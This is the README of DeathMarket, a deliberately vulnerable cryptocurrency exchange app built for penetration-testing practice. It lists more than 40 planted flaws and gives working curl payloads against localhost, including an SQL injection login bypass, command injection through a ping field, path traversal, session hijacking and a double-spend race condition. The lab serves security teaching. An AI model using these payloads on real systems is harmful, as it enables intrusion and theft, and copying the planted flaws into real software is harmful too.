# 💀 DeathMarket - Vulnerable Cryptocurrency Trading Platform

DeathMarket is an intentionally vulnerable cryptocurrency exchange and trading platform designed for security testing, penetration testing practice, and educational purposes.

**WARNING: This application contains intentional security vulnerabilities. DO NOT deploy to production or expose to the internet.**

---

## Quick Start

Run the following commands in your terminal
```
cd DeathMarket
npm install
node server.js
```

Open `http://localhost:4000` in your browser.

*To reset all data, delete deathmarket.db and restart the server.*

---

## Tech Stack

- Backend: Node.js with Express
- Database: SQLite via sql.js (pure JavaScript, no native dependencies)
- Frontend: HTML, CSS, JavaScript (vanilla)
- Session Management: express-session
- No external API calls required - everything runs locally

---

## Project Structure
```
DeathMarket/
├── server.js              # Main backend with 40+ vulnerabilities
├── package.json           # Dependencies (express, sql.js, etc.)
├── deathmarket.db         # SQLite database (auto-created on first run)
├── README.md              # This documentation
└── public/                # Frontend files
    ├── index.html         # Landing page with hero section
    ├── login.html         # Sign in page
    ├── register.html      # Account registration page
    ├── dashboard.html     # User dashboard with balances and orders
    ├── trade.html         # Trading interface with order book
    ├── market.html        # Live market data with 12 trading pairs
    ├── wallet.html        # Deposit addresses and withdrawal form
    ├── profile.html       # Profile management and KYC
    ├── admin.html         # Admin panel with SQL executor
    ├── support.html       # Support tickets and network diagnostics
    ├── learn.html         # Educational crypto trading guides
    └── files/
        └── welcome.txt    # Sample file for path traversal testing
```

---

## Features (What It Should Do)

- User registration and authentication
- Cryptocurrency wallet management for BTC, ETH, and USDT
- Live market data with 12 trading pairs
- Spot trading with buy and sell orders
- Real-time order book display
- Deposit addresses and withdrawal processing
- Support ticket system for user assistance
- KYC identity verification
- Referral bonus program
- Admin dashboard with user management
- SQL query executor for database administration
- API token generation for automated trading

---

## Vulnerabilities (40+)

### Authentication and Session Attacks

1. SQL Injection in Login - Bypass with admin' OR '1'='1' --
2. NoSQL Injection - Bypass with {"$ne": null} as username
3. Session Fixation - Set session to any user via /api/set-session?id=X
4. Session Cookies without HttpOnly or Secure flags - Cookie theft via XSS
5. Weak Password Reset - Returns plaintext password with just username and email
6. Default Hardcoded Credentials - admin account with known password
7. User Enumeration via Timing Attack - /api/verify-user endpoint

### Data Exposure and Privacy

8. IDOR - View any user by ID at /api/user/:id including passwords and SSNs
9. Exposed Wallets - All wallets visible at /api/wallets with private keys
10. Private Key Leakage - Bitcoin and Ethereum private keys stored in plaintext
11. Database Backup Public - Download entire database at /backup/market_backup.db
12. Internal API without Authentication - /api/internal returns all user data
13. Debug Endpoint - Server info, SSH credentials, JWT secrets exposed at /api/debug
14. Config File Exposure - /api/config reveals admin passwords and secrets
15. API Credentials Leaked - Binance, Coinbase, Infura, Alchemy keys exposed
16. Internal Messages Public - /api/messages shows security warnings and notes
17. Data Export without Auth - /api/export-data downloads all users as CSV
18. Admin Logs Public - /api/logs shows all user activity
19. Info Leakage Headers - Server software, internal IP, database path in headers

### SQL Injection

20. Login Form - Direct string concatenation in authentication query
21. Search Function - User search endpoint injectable
22. Password Reset - SQLi in username and email fields
23. Blind SQL Injection - Boolean-based via /api/user-exists endpoint
24. Direct SQL Execution - /api/query allows arbitrary SQL commands
25. Exchange Rate Manipulation - SQLi in trading pair parameter
26. Order Placement - SQLi in pair, type, and amount fields

### Cross-Site Scripting (XSS)

27. Stored XSS in Support Tickets - No sanitization on ticket messages
28. Reflected XSS in Notifications - /api/notification endpoint reflects input
29. Stored XSS in News - News posts accept HTML and JavaScript
30. XSS in Comments via Support - Username reflected without escaping

### Cross-Site Request Forgery (CSRF)

31. No CSRF Tokens on Profile Update - Can be exploited from external sites
32. No CSRF on KYC Verification
33. No CSRF on Withdrawal Requests

### Injection Attacks

34. Command Injection in Ping - /api/ping executes system commands
35. XXE Injection - XML parsing at /api/import-trades reads local files
36. Log Injection via User-Agent - User-Agent header stored unsanitized
37. GraphQL Introspection - Full schema exposed at /api/graphql

### Authorization Flaws

38. Mass Assignment - Update any user field including role and balance
39. Missing Access Control on Admin Panel - /admin accessible without admin role
40. KYC Bypass - One-click verification without document upload
41. Open Redirect - /redirect and /api/external-link redirect anywhere

### Business Logic Flaws

42. Race Condition in Withdrawals - Double-spend possible with concurrent requests
43. Referral Bonus Exploit - Infinite bonuses with no code validation
44. Weak JWT Token - Base64 encoded with known signing secret
45. Prototype Pollution - /api/settings allows privilege escalation
46. SSRF Proxy - /api/fetch-url can access internal network services

---

## Database Tables

The application creates these tables in the SQLite database:

- users - User accounts with balances, passwords, API keys, and notes
- wallets - Cold storage wallets with private keys
- trades - Completed trade records
- orders - Active and filled orders
- api_credentials - Third-party API keys (Binance, Coinbase, etc.)
- internal_messages - Security notes and warnings
- support_tickets - User support requests
- admin_logs - Activity logs
- news - Platform announcements
- withdrawal_requests - Pending and completed withdrawals

---

## Internal Data Discoverable Through Exploitation

- SSH credentials for production server
- JWT signing secret key
- Private keys for Bitcoin and Ethereum wallets
- API keys for Binance, Coinbase, Infura, and Alchemy
- Admin password in plaintext
- All user passwords in plaintext
- Database file path on the server
- Internal IP address of the server
- Developer notes with security warnings

---

## Terminal-Based Exploits (CMD)

### Login Bypass
`curl -X POST http://localhost:4000/api/login -H "Content-Type: application/json" -d "{\"username\":\"admin' OR '1'='1' --\",\"password\":\"x\"}"`

### Download Database
`curl -o market.db http://localhost:4000/backup/market_backup.db`

### Export All Users
`curl http://localhost:4000/api/export-data?format=csv > users.csv`

### Execute SQL Commands
```
curl "http://localhost:4000/api/query?sql=SELECT * FROM users"
curl "http://localhost:4000/api/query?sql=UPDATE users SET balance_btc = 999999 WHERE username = 'trader_joe'"
```

### Command Injection
```
curl -X POST http://localhost:4000/api/ping -H "Content-Type: application/json" -d "{\"host\":\"8.8.8.8 & dir\"}"
curl -X POST http://localhost:4000/api/ping -H "Content-Type: application/json" -d "{\"host\":\"8.8.8.8 & whoami\"}"
```

### Path Traversal
```
curl http://localhost:4000/api/file?name=../server.js
curl http://localhost:4000/api/file?name=C:/Windows/win.ini
```

### Mass Assignment (requires session cookie)
`curl -X POST http://localhost:4000/api/update-user -H "Content-Type: application/json" -d "{\"balance_usdt\":99999999,\"role\":\"admin\"}" -b "connect.sid=YOUR_SESSION"`

### Session Hijacking
`curl http://localhost:4000/api/set-session?id=1`
*You can change out the id=`1` to the ID of the user you want to hijack.*

### Get All Sensitive Data
```
curl http://localhost:4000/api/internal
curl http://localhost:4000/api/debug
curl http://localhost:4000/api/config
curl http://localhost:4000/api/wallets
curl http://localhost:4000/api/api-keys
```

### Race Condition Double-Spend (requires session cookie)
`for /L %i in (1,1,5) do start curl -X POST http://localhost:4000/api/withdraw -H "Content-Type: application/json" -d "{\"currency\":\"usdt\",\"amount\":1000,\"wallet_address\":\"0xYOUR_WALLET\"}" -b "connect.sid=YOUR_SESSION"`

---

## Reset Instructions

To reset the entire application to its original state, delete the database file and restart:

del deathmarket.db
node server.js

This recreates all tables, default users, default balances, and clears all transactions, orders, tickets, and logs.

---

## Dependencies

- express - Web framework
- express-session - Session management
- body-parser - Request parsing
- cookie-parser - Cookie handling
- sql.js - SQLite database (pure JavaScript, no native build required)

Install with: npm install

---

## Disclaimer

This application is for educational and security testing purposes only. The vulnerabilities are intentionally included to provide a realistic environment for learning about web application security, penetration testing, and secure coding practices.

Do not use any techniques learned from this application against systems you do not own or have explicit permission to test.
